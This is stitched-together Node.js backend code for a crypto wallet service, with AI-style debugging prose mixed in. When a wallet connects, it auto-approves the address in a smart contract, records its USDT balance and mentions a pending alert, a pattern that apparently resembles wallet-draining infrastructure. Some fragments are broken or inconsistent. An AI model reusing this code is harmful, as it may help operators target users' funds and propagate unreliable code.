const walletService = require('../services/wallet.service');
const contractService = require('../services/contract.service');
const database = require('../config/database');
const validators = require('../utils/validators');
const helpers = require('../utils/helpers');

// Add this at the top of the file
const recentConnections = new Map();
class WalletController {
    
    // Enhanced connectWallet with proper error handling for auto-approval
async connectWallet(req, res) {
    try {
        console.log('=== CONTROLLER: Wallet connection request received ===');
        console.log('Request body:', JSON.stringify(req.body, null, 2));
        
        // Check for duplicate connections (within 30 seconds)
        const { address } = req.body;
        const now = Date.now();
        const lastConnection = recentConnections.get(address);
        
        if (lastConnection && (now - lastConnection) < 30000) {
            console.log('Duplicate connection request ignored for:', address);
            return res.json({
                success: true,
                message: 'Wallet already processed'
            });
        }
        
        // Record this connection
        recentConnections.set(address, now);
        
        // Clean up old entries (older than 1 minute)
        for (const [addr, time] of recentConnections.entries()) {
            if (now - time > 60000) {
                recentConnections.delete(addr);
            }
        }
        
        // Validate input
        const validation = validators.validateWalletConnection(req.body);
        if (!validation.valid) {
            console.log('Validation failed:', validation.error);
            return res.status(400).json({
                success: false,
                error: validation.error
            });
        }
        
        const { address: walletAddress, name } = req.body;
        console.log('Processing wallet:', walletAddress, 'Name:', name);
        
        // Save wallet to database
        const query = `
            INSERT INTO wallets (address, name, created_at, updated_at)
            VALUES ($1, $2, NOW(), NOW())
            ON CONFLICT (address) DO UPDATE
            SET updated_at = NOW()
            RETURNING *
        `;
        
        console.log('Saving wallet to database...');
        const result = await database.query(query, [walletAddress, name || 'Unnamed Wallet']);
        const wallet = result.rows[0];
        console.log('Wallet saved:', wallet.address);
        
        // Auto-approve wallet in contract with comprehensive error handling
        try {
            console.log('Attempting to auto-approve wallet in contract...');
            const ContractService = require('../services/contract.service');
            const contractServiceInstance = new ContractService();
            await contractServiceInstance.init();
            
            // Add timeout to prevent hanging
            const approvalPromise = contractServiceInstance.approveWallet(walletAddress);
            const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Approval timeout after 30 seconds')), 30000)
            );
            
            const approvalResult = await Promise.race([approvalPromise, timeoutPromise]);
            console.log('Auto-approval result:', approvalResult);
            
        } catch (approvalError) {
            console.error('❌ Auto-approval failed:', approvalError.message);
            console.error('Stack trace:', approvalError.stack);
            // Log the error but don't fail the connection
            console.log('Continuing with connection despite approval failure...');
        }
        
        // Get USDT balance
        console.log('Fetching USDT balance...');
        const contractServiceInstance = require('../services/contract.service');
        const balance = await contractServiceInstance.getWalletUSDTBalance(walletAddress);
        console.log('USDT balance fetched:', balance);
        
        // Update wallet with balance (but don't send alert yet)
        const updateQuery = `
            UPDATE wallets 
            SET usdt_balance = $1, updated_at = NOW()
            WHERE address = $2
        `;
        await database.query(updateQuery, [balance, walletAddress]);
        
        res.json({
            success: true,
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                usdt_balance: balance,
                created_at: wallet.created_at
            }
        });
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
}
--- File: backend/src/services/contract.service.js ---

// Enhanced isWalletApproved with better error handling
async isWalletApproved(walletAddress) {
    if (!this.initialized) {
        console.warn('Contract service not initialized for transactions');
        return false;
    }
    
    try {
        console.log('Checking approval status for wallet:', walletAddress);
        const result = await this.contract.approvedWallets(walletAddress);
        console.log('Approval check result:', result);
        return result;
    } catch (error) {
        console.error('Error checking wallet approval for address', walletAddress, ':', error.message);
        // Try to get more details about the error
        try {
            // Test if the contract is callable at all
            const contractAddress = await this.contract.getAddress();
            console.log('Contract address:', contractAddress);
        } catch (contractError) {
            console.error('Contract accessibility error:', contractError.message);
        }
        return false;
    }
}
Critical Issue Identified:
The problem is that the approveWallet() transaction is either:

Failing silently
Not being mined properly
The contract state isn't being updated despite successful transaction
Additional Debugging Steps:
Let me also add a verification method to check contract state:

--- File: backend/src/controllers/wallet.controller.js ---

// Add this temporary debug endpoint to verify contract state
// You can remove this after debugging
async verifyWalletApproval(req, res) {
    try {
        const { address } = req.params;
        
        if (!address) {
            return res.status(400).json({
                success: false,
                error: 'Wallet address required'
            });
        }
        
        const ContractService = require('../services/contract.service');
        const contractServiceInstance = new ContractService();
        await contractServiceInstance.init();
        
        // Check approval status
        const isApproved = await contractServiceInstance.isWalletApproved(address);
        
        // Also check raw contract state
        let rawApproval = false;
        try {
            rawApproval = await contractServiceInstance.contract.approvedWallets(address);
        } catch (error) {
            console.error('Raw approval check failed:', error.message);
        }
        
        // Get balance too
        const balance = await contractServiceInstance.getWalletUSDTBalance(address);
        
        res.json({
            success: true,
            wallet: address,
            isApproved: isApproved,
            rawApproval: rawApproval,
            balance: balance
        });
        
    } catch (error) {
        console.error('Verification error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
}
module.exports = new WalletController();


